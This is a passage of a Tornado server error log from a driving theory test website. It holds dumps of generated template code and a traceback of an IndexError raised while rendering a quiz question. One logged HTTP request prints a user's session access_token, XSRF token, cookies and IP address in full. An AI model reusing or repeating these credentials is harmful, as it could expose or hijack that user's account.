 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b6b818e4c854816f48743&answers=%5B3%5D&cursor=5&_xsrf=c61bbcc368ff43dfae27f2c753f54e78', headers={'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '109.158.140.86', 'Origin': 'http://www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'X-Privly-Version': '0.0.7', 'Referer': 'http://www.intheory.co.uk/test/new', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3; __utma=188782963.911667569.1347965546.1348162371.1348168472.3; __utmb=188782963.5.10.1348168472; __utmc=188782963; __utmz=188782963.1347965546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 116.31ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
